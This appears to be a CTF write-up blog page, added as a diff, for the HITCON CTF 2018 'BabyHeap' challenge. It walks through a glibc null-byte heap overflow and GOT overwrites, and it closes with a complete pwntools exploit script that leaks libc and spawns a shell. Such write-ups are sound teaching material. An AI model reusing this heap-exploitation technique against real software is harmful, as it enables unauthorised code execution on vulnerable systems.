@@ -1,0 +1,516 @@
+<!doctype html>
+<html lang="">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>BabyHeap - HITCON CTF 2018 - slashb4sh</title>
+    <meta name="HandheldFriendly" content="True">
+    <meta name="MobileOptimized" content="320">
+    <meta name="referrer" content="no-referrer">
+    <meta name="description" content="">
+    <meta property="og:site_name" content="slashb4sh" />
+    <meta property="og:locale" content="nn_NO" />
+    <meta property="og:type" content="article" />
+    <meta property="og:url" content="/blog/babyheap/" />
+    <meta property="og:title" content="BabyHeap - HITCON CTF 2018" />
+    <meta property="og:image" content="/" />
+    <meta property="og:description" content="" />
+
+    
+        <meta property="twitter:site" content="@twitter.com/slashb4sh">
+    
+
+    <meta property="twitter:title" content="BabyHeap - HITCON CTF 2018" />
+    <meta property="twitter:image" content="/" />
+    <meta property="twitter:card" content="summary" />
+    <meta property="twitter:description" content="" />
+
+    
+
+    <link rel="canonical" href="/blog/babyheap/">
+
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+
+    <link rel="stylesheet" href="/css/main.css" />
+
+    
+        <link rel="stylesheet" href="/css/highlight.css" />
+    
+
+    
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/progressively/1.2.5/progressively.min.css" integrity="sha256-xbqLYBMsjpuCihs+3Fgp/MFMtPdo2SWKoOjEWOqR4X0=" crossorigin="anonymous" />
+    
+
+    <link rel="shortcut icon"
+          href="/img/favicon.ico">
+
+    <link href='' rel="alternate" type="application/rss+xml" title="slashb4sh" />
+    <link href="https://fonts.googleapis.com/css?family=Fira+Code|Merriweather+Sans:400,700|Merriweather:400,700&display=swap" rel="stylesheet">
+</head>
+
+<body>
+    
+    
+
+    
+
+    
+
+<div class="my-4 my-md-5 header">
+    <div class="container">
+        <div class="row">
+            <div class="col-auto d-none d-md-block">
+                
+            </div>
+            <div class="col-auto align-self-center mr-auto">
+                <a href="/">
+                    <h1 class="font-weight-bold name">
+                        slashb4sh
+                    </h1>
+                </a>
+
+                <ul class="nav nav-primary">
+                    
+                        <li class="nav-item">
+                            <a class="text-uppercase nav-link text-blog" href="/blog/">
+                                
+                                Blog
+                            </a>
+                        </li>
+                    
+                        <li class="nav-item">
+                            <a class="text-uppercase nav-link text-about" href="/about/">
+                                
+                                About
+                            </a>
+                        </li>
+                    
+
+                    
+                </ul>
+
+                <ul class="nav nav-secondary">
+                    
+                </ul>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+    <div class="content">
+        <div class="container">
+            <div class="row justify-content-center">
+                <div
+                    
+                    class="col-md-9 col-lg-9"
+                    
+                >
+                    <h1 class="mx-0 mx-md-4">
+                        BabyHeap - HITCON CTF 2018
+                    </h1>
+
+                    <div class="mb-4 mb-md-5 meta">
+                        <span class="date" title='Mon Jan 7 2019 13:00:00 UTC'>
+                            January 07, 2019
+                        </span>
+
+                        
+                            
+                        
+
+                        <span class="reading-time middot">
+                            5 minutes
+                        </span>
+
+                        <div class="d-none d-md-inline tags">
+                            <ul class="list-unstyled d-inline">
+                                
+                                    <li class="d-inline middot">
+                                        <a href="/tags/ctf">CTF</a>
+                                    </li>
+                                
+                                    <li class="d-inline middot">
+                                        <a href="/tags/writeup">Writeup</a>
+                                    </li>
+                                
+                                    <li class="d-inline middot">
+                                        <a href="/tags/pwn">Pwn</a>
+                                    </li>
+                                
+                            </ul>
+                        </div>
+
+                        <div class="d-none d-md-inline tags">
+                            <ul class="list-unstyled d-inline">
+                                
+                                
+                            </ul>
+                        </div>
+                    </div>
+
+                    <div class="markdown">
+                        
+    
+    <p>Linux GLIBC Heap Exploitation of a null-byte overflow</p>
+<!-- raw HTML omitted -->
+<pre><code>#########################
+        Baby Heap
+#########################
+ 1 . New
+ 2 . Delete
+ 3 . Edit
+ 4 . Exit
+#########################
+Your choice:
+</code></pre><p>The program lets me create a structure in the heap. The structure goes like this</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++"><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">data</span> {
+	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> size;
+	<span style="color:#66d9ef">char</span> name[<span style="color:#ae81ff">8</span>];
+	<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> content;
+}
+</code></pre></div><p>I can also free and edit the structure, but each of these actions can be performed only once.</p>
+<h3 id="checksec">Checksec</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gdb-peda$ checksec
+CANARY    : ENABLED
+FORTIFY   : ENABLED
+NX        : ENABLED
+PIE       : disabled
+RELRO     : Partial
+</code></pre></div><h3 id="the-vulnerability">The vulnerability</h3>
+<p>The bug is quite straight forward, there is a <strong>null byte overflow</strong> when I enter the name, partially overwriting the content pointer on the structure.</p>
+<pre><code>gdb-peda$ x/10gx 0x00603000
+0x603000:    0x0000000000000000    0x0000000000000021
+0x603010:    0x0000000000000400    0x6262626262626262
+0x603020:    0x0000000000603000    0x0000000000000411
+0x603030:    0x6161616161616161    0x6161616161616161
+0x603040:    0x6161616161616161    0x6161616161616161
+</code></pre><p>I can see that the content pointer points to the structure, letting me overwrite the content pointer.
+There is no view functionality that could possibly give us a leak, also PIE is disabled, so I am assuming we have to overwrite atoi() GOT entry with printf() to get libc leak.
+But the above method requires me to use the Edit functionality twice, which is not possible, this got me stuck and thinking.</p>
+<p>I was just going through the program memory, and I saw that there is only a stdout file structure pointer in .bss section. This means that stdin input will get buffered in the heap (You can see this is the program decompilation, but I didn&rsquo;t pay much attention to the init() function). 
+Scanf() is being used only when you exit (the y/n option looked fishy in the first place).</p>
+<p>The buffer chunk in heap is of size 0x1010, having the structure after this chunk looks good.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gdb-peda$ x/16gx 0x00705000+0xfe0
+0x705fe0:    0x6161616161616161    0x6161616161616161
+0x705ff0:    0x0000000000000000    0x0000000000000211
+0x706000:    0x0000000000000000    0x0000000000000000
+0x706010:    0x0000000000000000    0x0000000000000021
+0x706020:    0x0000000000000400    0x4242424242424242
+0x706030:    0x0000000000706000    0x0000000000000411
+0x706040:    0x4141414141414141    0x4141414141414141
+0x706050:    0x4141414141414141    0x4141414141414141
+</code></pre></div><p>In the previous scenario, the content pointer was pointing to the structure, calling the free() upon it would end up in an error as that pointer wasn&rsquo;t a valid chunk.</p>
+<p>Now I can create ovelapping chunks in heap.
+I create a fake chunk in the stdin buffer and free it, since content points to memory in the stdin buffer. I also place fake chunks appropriately so the sanity checks and double free corruption checks are bypassed.</p>
+<p>Allocating the same chunk again, I have complete control over the structure. Now I can change the content pointer to a GOT address and later edit it.</p>
+<p>Here&rsquo;s what I am going to do:</p>
+<ul>
+<li>Overwrite atoi() GOT with printf() PLT and get a libc leak.</li>
+<li>Overwrite aoit() GOT again with system() and get my shell.</li>
+</ul>
+<p>To accomplish this I need the &ldquo;Edit&rdquo; functionality more than once.
+To bypass the one time edit constraint, I overwrite the exit() GOT with a ret ropgadget. 
+Look at the dissassembly of the Edit:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#960050;background-color:#1e0010">0</span>x400b61:	<span style="color:#a6e22e">push</span>   rbp
+<span style="color:#960050;background-color:#1e0010">0</span>x400b62:	<span style="color:#a6e22e">mov</span>    rbp,rsp
+<span style="color:#960050;background-color:#1e0010">0</span>x400b65:	<span style="color:#a6e22e">mov</span>    rax,<span style="color:#66d9ef">QWORD</span> PTR [rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x201544</span>]        
+<span style="color:#960050;background-color:#1e0010">0</span>x400b6c:	<span style="color:#a6e22e">test</span>   rax,rax
+<span style="color:#960050;background-color:#1e0010">0</span>x400b6f:	<span style="color:#a6e22e">je</span>     <span style="color:#ae81ff">0x400b7b</span>
+<span style="color:#960050;background-color:#1e0010">0</span>x400b71:	<span style="color:#a6e22e">mov</span>    eax,<span style="color:#66d9ef">DWORD</span> PTR [rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x20152d</span>]        
+<span style="color:#960050;background-color:#1e0010">0</span>x400b77:	<span style="color:#a6e22e">test</span>   eax,eax
+<span style="color:#960050;background-color:#1e0010">0</span>x400b79:	<span style="color:#a6e22e">je</span>     <span style="color:#ae81ff">0x400b8f</span>
+<span style="color:#960050;background-color:#1e0010">0</span>x400b7b:	<span style="color:#a6e22e">mov</span>    edi,<span style="color:#ae81ff">0x400e0a</span>
+<span style="color:#960050;background-color:#1e0010">0</span>x400b80:	<span style="color:#a6e22e">call</span>   <span style="color:#ae81ff">0x400760</span> <span style="color:#f92672">&lt;</span>puts@plt<span style="color:#f92672">&gt;</span>
+<span style="color:#960050;background-color:#1e0010">0</span>x400b85:	<span style="color:#a6e22e">mov</span>    edi,<span style="color:#ae81ff">0x0</span>
+<span style="color:#960050;background-color:#1e0010">0</span>x400b8a:	<span style="color:#a6e22e">call</span>   <span style="color:#ae81ff">0x400740</span> <span style="color:#f92672">&lt;</span>_exit@plt<span style="color:#f92672">&gt;</span>     <span style="color:#960050;background-color:#1e0010">#</span> A ret here will remove the constraint
+<span style="color:#960050;background-color:#1e0010">0</span>x400b8f:	<span style="color:#a6e22e">mov</span>    edi,<span style="color:#ae81ff">0x400e19</span>
+<span style="color:#960050;background-color:#1e0010">0</span>x400b94:	<span style="color:#a6e22e">mov</span>    eax,<span style="color:#ae81ff">0x0</span>
+<span style="color:#960050;background-color:#1e0010">0</span>x400b99:	<span style="color:#a6e22e">call</span>   <span style="color:#ae81ff">0x400780</span> <span style="color:#f92672">&lt;</span>printf@plt<span style="color:#f92672">&gt;</span>
+<span style="color:#960050;background-color:#1e0010">0</span>x400b9e:	<span style="color:#a6e22e">mov</span>    rax,<span style="color:#66d9ef">QWORD</span> PTR [rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x20150b</span>]        
+<span style="color:#960050;background-color:#1e0010">0</span>x400ba5:	<span style="color:#a6e22e">mov</span>    rax,<span style="color:#66d9ef">QWORD</span> PTR [rax]
+<span style="color:#960050;background-color:#1e0010">0</span>x400ba8:	<span style="color:#a6e22e">mov</span>    edx,eax
+<span style="color:#960050;background-color:#1e0010">0</span>x400baa:	<span style="color:#a6e22e">mov</span>    rax,<span style="color:#66d9ef">QWORD</span> PTR [rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x2014ff</span>]        
+<span style="color:#960050;background-color:#1e0010">0</span>x400bb1:	<span style="color:#a6e22e">mov</span>    rax,<span style="color:#66d9ef">QWORD</span> PTR [rax<span style="color:#f92672">+</span><span style="color:#ae81ff">0x10</span>]
+<span style="color:#960050;background-color:#1e0010">0</span>x400bb5:	<span style="color:#a6e22e">mov</span>    esi,edx
+<span style="color:#960050;background-color:#1e0010">0</span>x400bb7:	<span style="color:#a6e22e">mov</span>    rdi,rax
+<span style="color:#960050;background-color:#1e0010">0</span>x400bba:	<span style="color:#a6e22e">call</span>   <span style="color:#ae81ff">0x400975</span>
+<span style="color:#960050;background-color:#1e0010">0</span>x400bbf:	<span style="color:#a6e22e">mov</span>    eax,<span style="color:#66d9ef">DWORD</span> PTR [rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x2014df</span>]        
+<span style="color:#960050;background-color:#1e0010">0</span>x400bc5:	<span style="color:#a6e22e">add</span>    eax,<span style="color:#ae81ff">0x1</span>
+<span style="color:#960050;background-color:#1e0010">0</span>x400bc8:	<span style="color:#a6e22e">mov</span>    <span style="color:#66d9ef">DWORD</span> PTR [rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x2014d6</span>],eax        
+<span style="color:#960050;background-color:#1e0010">0</span>x400bce:	<span style="color:#a6e22e">mov</span>    edi,<span style="color:#ae81ff">0x400e28</span>
+<span style="color:#960050;background-color:#1e0010">0</span>x400bd3:	<span style="color:#a6e22e">call</span>   <span style="color:#ae81ff">0x400760</span> <span style="color:#f92672">&lt;</span>puts@plt<span style="color:#f92672">&gt;</span>
+<span style="color:#960050;background-color:#1e0010">0</span>x400bd8:	<span style="color:#a6e22e">nop</span>
+<span style="color:#960050;background-color:#1e0010">0</span>x400bd9:	<span style="color:#a6e22e">pop</span>    rbp
+<span style="color:#960050;background-color:#1e0010">0</span>x400bda:	<span style="color:#a6e22e">ret</span>
+</code></pre></div><p>I still can&rsquo;t change the content pointer in the structure, have to get to atoi() GOT from exit() GOT.</p>
+<h3 id="here-is-my-exploit-code">Here is my exploit code</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+s<span style="color:#f92672">=</span>process(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">./babyheap</span><span style="color:#e6db74">&#34;</span>,env<span style="color:#f92672">=</span>{<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">LD_PRELOAD</span><span style="color:#e6db74">&#39;</span> : <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./libc.so.6</span><span style="color:#e6db74">&#39;</span>})
+libc<span style="color:#f92672">=</span>ELF(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">./libc.so.6</span><span style="color:#e6db74">&#34;</span>)
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">new</span>(size,content,name):
+	s<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Your choice:</span><span style="color:#e6db74">&#34;</span>,str(<span style="color:#ae81ff">1</span>))
+	s<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Size :</span><span style="color:#e6db74">&#34;</span>,str(size))
+	s<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Content:</span><span style="color:#e6db74">&#34;</span>,content)
+	s<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Name:</span><span style="color:#e6db74">&#34;</span>,name)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">remove</span>():
+	s<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Your choice:</span><span style="color:#e6db74">&#34;</span>,str(<span style="color:#ae81ff">2</span>))
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">edit</span>(content,f<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>):
+	<span style="color:#66d9ef">if</span>(f<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>):
+		s<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Your choice:</span><span style="color:#e6db74">&#34;</span>,str(<span style="color:#ae81ff">3</span>))
+	<span style="color:#66d9ef">else</span> :
+		s<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Your choice:</span><span style="color:#e6db74">&#34;</span>,str(<span style="color:#ae81ff">4</span>))
+	s<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Content:</span><span style="color:#e6db74">&#34;</span>,content)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exit</span>(content):
+	s<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Your choice:</span><span style="color:#e6db74">&#34;</span>,str(<span style="color:#ae81ff">4</span>))
+	s<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Really? (Y/n)</span><span style="color:#e6db74">&#34;</span>,content)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">ed</span>(content,ch<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>):
+	s<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Your choice:</span><span style="color:#e6db74">&#34;</span>,str(ch))
+	s<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Content:</span><span style="color:#e6db74">&#34;</span>,content)
+
+exit_got<span style="color:#f92672">=</span><span style="color:#ae81ff">0x602020</span>
+edit_addr<span style="color:#f92672">=</span><span style="color:#ae81ff">0x400b8f</span>
+ret<span style="color:#f92672">=</span>p64(<span style="color:#ae81ff">0x0000000000400711</span>)
+free                <span style="color:#f92672">=</span>p64(<span style="color:#ae81ff">0x400730</span>)
+exit_plt              <span style="color:#f92672">=</span>p64(<span style="color:#ae81ff">0x400740</span>)
+read_chk          <span style="color:#f92672">=</span>p64(<span style="color:#ae81ff">0x400756</span>)
+puts                <span style="color:#f92672">=</span>p64(<span style="color:#ae81ff">0x400766</span>)
+stack_chk_fail    <span style="color:#f92672">=</span>p64(<span style="color:#ae81ff">0x400776</span>)
+printf              <span style="color:#f92672">=</span>p64(<span style="color:#ae81ff">0x400786</span>)
+alarm               <span style="color:#f92672">=</span>p64(<span style="color:#ae81ff">0x400796</span>)
+read                <span style="color:#f92672">=</span>p64(<span style="color:#ae81ff">0x4007a6</span>)
+libc_start_main   <span style="color:#f92672">=</span>p64(<span style="color:#ae81ff">0x4007b6</span>)
+signal              <span style="color:#f92672">=</span>p64(<span style="color:#ae81ff">0x4007c6</span>)
+malloc              <span style="color:#f92672">=</span>p64(<span style="color:#ae81ff">0x4007d6</span>)
+setvbuf             <span style="color:#f92672">=</span>p64(<span style="color:#ae81ff">0x4007e6</span>)
+atoi                <span style="color:#f92672">=</span>p64(<span style="color:#ae81ff">0x4007f6</span>)
+scanf      <span style="color:#f92672">=</span>p64(<span style="color:#ae81ff">0x400806</span>)
+
+<span style="color:#75715e"># Creating a fake chunk in the stdin buffer.</span>
+exit(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">n</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">0x1000</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x20</span>,<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">a</span><span style="color:#e6db74">&#34;</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x00</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x211</span>))
+
+<span style="color:#75715e"># Creating a new structure and freeing the fake chunk.</span>
+new(<span style="color:#ae81ff">0x400</span>,<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">A</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x1c0</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x00</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x21</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">a</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x10</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x00</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x21</span>),<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">B</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>)
+remove()
+
+<span style="color:#75715e"># Allocating the fake chunk to changing the content pointer to exit() GOT in the structure.</span>
+new(<span style="color:#ae81ff">0x200</span>,<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">a</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x10</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x00</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x21</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x200</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x00</span>) <span style="color:#f92672">+</span>p64(exit_got) <span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0x411</span>),<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">5</span>)
+
+<span style="color:#75715e"># Editing exit() GOT with ret instruction.</span>
+edit(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x11</span><span style="color:#ae81ff">\x07</span><span style="color:#ae81ff">\x40</span><span style="color:#e6db74">&#34;</span>)
+
+<span style="color:#75715e"># Editing atoi() GOT with printf() PLT to get libc leak.</span>
+ed(ret <span style="color:#f92672">+</span> read_chk <span style="color:#f92672">+</span> puts <span style="color:#f92672">+</span> stack_chk_fail <span style="color:#f92672">+</span> printf <span style="color:#f92672">+</span> alarm <span style="color:#f92672">+</span> read <span style="color:#f92672">+</span> libc_start_main <span style="color:#f92672">+</span> signal <span style="color:#f92672">+</span> malloc <span style="color:#f92672">+</span> setvbuf <span style="color:#f92672">+</span> printf <span style="color:#f92672">+</span> scanf)
+s<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Your choice:</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%</span><span style="color:#e6db74">p</span><span style="color:#e6db74">%</span><span style="color:#e6db74">p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">%</span><span style="color:#e6db74">p</span><span style="color:#e6db74">&#34;</span>)
+s<span style="color:#f92672">.</span>recvline()
+libc_base<span style="color:#f92672">=</span>int(s<span style="color:#f92672">.</span>recvline(),<span style="color:#ae81ff">16</span>)<span style="color:#f92672">-</span><span style="color:#ae81ff">0x116cdc</span>
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">LIBC_LEAK = </span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> hex(libc_base))
+system <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">system</span><span style="color:#e6db74">&#39;</span>]
+
+<span style="color:#75715e"># overwriting atoi() GOT with system() to get shell.</span>
+ed(ret <span style="color:#f92672">+</span> read_chk <span style="color:#f92672">+</span> puts <span style="color:#f92672">+</span> stack_chk_fail <span style="color:#f92672">+</span> printf <span style="color:#f92672">+</span> alarm <span style="color:#f92672">+</span> read <span style="color:#f92672">+</span> libc_start_main <span style="color:#f92672">+</span> signal <span style="color:#f92672">+</span> malloc <span style="color:#f92672">+</span> setvbuf <span style="color:#f92672">+</span> p64(system) <span style="color:#f92672">+</span> scanf,<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">11</span><span style="color:#e6db74">&#34;</span>)
+s<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Your choice:</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/bin/sh</span><span style="color:#e6db74">&#34;</span>)
+
+s<span style="color:#f92672">.</span>interactive()
+</code></pre></div>
+
+
+                    </div>
+                </div>
+
+                
+                    <div class="col-sm-12 col-md-3">
+                        <nav id="TableOfContents" class="sticky-top">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#checksec">Checksec</a></li>
+        <li><a href="#the-vulnerability">The vulnerability</a></li>
+        <li><a href="#here-is-my-exploit-code">Here is my exploit code</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+                    </div>
+                
+            </div>
+
+            <div class="row">
+                <div
+                    
+                    class="col-md-9 col-lg-9"
+                    
+                >
+                    
+                        <div class="navigation">
+                            <div class="row">
+                                <div class="col-12 col-md-6">
+                                    
+                                        <div class="mx-0 mx-md-4 mt-4 text-left">
+                                            <a href="/blog/tamu18/">
+                                                <span class="icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 477.175 477.175">
+        <path d="M145.188,238.575l215.5-215.5c5.3-5.3,5.3-13.8,0-19.1s-13.8-5.3-19.1,0l-225.1,225.1c-5.3,5.3-5.3,13.8,0,19.1l225.1,225 c2.6,2.6,6.1,4,9.5,4s6.9-1.3,9.5-4c5.3-5.3,5.3-13.8,0-19.1L145.188,238.575z" />
+    </svg>
+</span>
+
+                                                <span class="text">TAMU CTF 2018</span>
+                                            </a>
+                                        </div>
+                                    
+                                </div>
+                                <div class="col-12 col-md-6">
+                                    
+                                        <div class="mx-0 mx-md-4 mt-4 text-right">
+                                            <a href="/blog/sleepyholder/">
+                                                <span class="text">SleepyHolder - HITCON CTF 2016</span>
+                                                <span class="icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 477.175 477.175">
+        <path d="M360.731,229.075l-225.1-225.1c-5.3-5.3-13.8-5.3-19.1,0s-5.3,13.8,0,19.1l215.5,215.5l-215.5,215.5 c-5.3,5.3-5.3,13.8,0,19.1c2.6,2.6,6.1,4,9.5,4c3.4,0,6.9-1.3,9.5-4l225.1-225.1C365.931,242.875,365.931,234.275,360.731,229.075z" />
+    </svg>
+</span>
+
+                                            </a>
+                                        </div>
+                                    
+                                </div>
+                            </div>
+                        </div>
+                    
+
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="my-4 footer">
+    <div class="container">
+        <div class="row justify-content-center">
+            <div class="col-sm-12 col-md-6 col-lg-5">
+                <div class="mx-0 mx-md-4 mb-2 text-center text-md-left">
+                    
+
+                    
+                </div>
+            </div>
+            <div class="col-sm-12 col-md-6 col-lg-5">
+                <div class="mx-0 mx-md-4 text-center text-md-right">
+                    
+
+                    
+
+                    
+    <a href="https://github.com/github.com/maheshhari"
+        target="_blank"
+        class="mx-1 ml-md-2 mr-md-0 icon"
+        aria-label="GitHub">
+
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" fill-rule="evenodd" clip-rule="evenodd" stroke-linejoin="round" stroke-miterlimit="1.414">
+            <path d="M8 0C3.58 0 0 3.582 0 8c0 3.535 2.292 6.533 5.47 7.59.4.075.547-.172.547-.385 0-.19-.007-.693-.01-1.36-2.226.483-2.695-1.073-2.695-1.073-.364-.924-.89-1.17-.89-1.17-.725-.496.056-.486.056-.486.803.056 1.225.824 1.225.824.714 1.223 1.873.87 2.33.665.072-.517.278-.87.507-1.07-1.777-.2-3.644-.888-3.644-3.953 0-.873.31-1.587.823-2.147-.09-.202-.36-1.015.07-2.117 0 0 .67-.215 2.2.82.64-.178 1.32-.266 2-.27.68.004 1.36.092 2 .27 1.52-1.035 2.19-.82 2.19-.82.43 1.102.16 1.915.08 2.117.51.56.82 1.274.82 2.147 0 3.073-1.87 3.75-3.65 3.947.28.24.54.73.54 1.48 0 1.07-.01 1.93-.01 2.19 0 .21.14.46.55.38C13.71 14.53 16 11.53 16 8c0-4.418-3.582-8-8-8"/>
+        </svg>
+    </a>
+
+
+                    
+
+                    
+    <a href="https://twitter.com/twitter.com/slashb4sh"
+        target="_blank"
+        class="mx-1 ml-md-2 mr-md-0 icon"
+        aria-label="Twitter">
+
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" fill-rule="evenodd" clip-rule="evenodd" stroke-linejoin="round" stroke-miterlimit="1.414">
+            <path d="M16 3.038c-.59.26-1.22.437-1.885.517.677-.407 1.198-1.05 1.443-1.816-.634.37-1.337.64-2.085.79-.598-.64-1.45-1.04-2.396-1.04-1.812 0-3.282 1.47-3.282 3.28 0 .26.03.51.085.75-2.728-.13-5.147-1.44-6.766-3.42C.83 2.58.67 3.14.67 3.75c0 1.14.58 2.143 1.46 2.732-.538-.017-1.045-.165-1.487-.41v.04c0 1.59 1.13 2.918 2.633 3.22-.276.074-.566.114-.865.114-.21 0-.41-.02-.61-.058.42 1.304 1.63 2.253 3.07 2.28-1.12.88-2.54 1.404-4.07 1.404-.26 0-.52-.015-.78-.045 1.46.93 3.18 1.474 5.04 1.474 6.04 0 9.34-5 9.34-9.33 0-.14 0-.28-.01-.42.64-.46 1.2-1.04 1.64-1.7z" fill-rule="nonzero"/>
+        </svg>
+    </a>
+
+
+                    
+
+                    
+
+                    
+
+                    
+    <a href="mailto:maheshpdm2@gmail.com"
+        class="mx-1 ml-md-2 mr-md-0 icon"
+        aria-label="Email">
+
